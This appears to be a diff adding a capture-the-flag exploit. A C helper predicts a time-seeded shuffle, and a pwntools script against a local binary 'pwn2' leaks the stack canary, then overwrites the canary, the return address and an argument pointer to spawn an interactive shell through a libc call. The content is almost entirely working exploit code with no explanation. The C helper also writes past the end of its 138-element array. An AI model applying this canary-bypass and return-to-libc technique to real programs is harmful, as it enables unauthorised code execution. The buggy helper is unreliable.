@@ -1,0 +1,86 @@
+printrand.c
+
+#include <stdio.h>
+#include <time.h>
+int main(){
+	time_t seed =time(0);
+	printf("%lu ",seed);
+	srand(seed);
+	int v[138];
+	int i,j,v4;
+
+	for(j=0;j<139;j++){
+		v[j]=j+1;
+	}
+    
+    for(j=138;j>-1;j--){
+    	i = rand();
+    	v4=v[j];
+    	v[j]=v[i%(j+1)];
+    	v[i%(j+1)]=v4;
+    }
+    // v4= v[4];
+    // v[4] = v[100];
+    // v[100]=v4;
+    printf("\n");
+    printf("canary:%d\n",v[132]);
+    
+    
+    printf("ret:%d\n",v[136]);
+    
+    
+    printf("str:%d\n",v[138]);
+
+    for (j=0;j<139;j++){
+        printf("%u ", v[j]);
+    }
+}
+
+
+exp.py
+
+from pwn import *
+import os
+
+#context.log_level = 'debug'
+
+p = process("./pwn2")
+
+output=os.popen("./printrand")
+e = ELF("pwn2")
+x,ret,canary,str_sh,y= output.read().split("\n")
+print ret,canary,str_sh
+sss = [ret,canary,str_sh]
+for i in sss:
+    if i.startswith("ret"):
+    	ret = i[4:]
+    if i.startswith("canary"):
+    	canary=i[7:]
+    if i.startswith("str"):
+    	str_sh=i[4:]
+print ret,canary,str_sh
+print y
+p.readuntil(" is? ")
+p.sendline("12345678901234567")
+canary_real = p.readuntil("\n")
+
+canary_real = u32("\x00"+canary_real[-9:-6])
+print canary_real
+#gdb.attach(p)
+gift = (p.readuntil("\n")[-3:-1]).strip().zfill(2)
+print gift
+p.readuntil("input? ")
+p.sendline("139")
+gdb.attach(p)
+for i in range(139):
+	p.readuntil(": ")
+	#p.sendline(str(i+1))
+	if str(i+1)==ret:
+		p.sendline(str(int("0xb75"+gift+"310",16)))
+	elif str(i+1)==canary:
+		p.sendline(str(canary_real))
+	elif str(i+1)==str_sh:
+		p.sendline(str(int("0xb75"+gift+"310",16)+0x122a3c))
+	else:
+		p.sendline("1111")
+p.interactive()
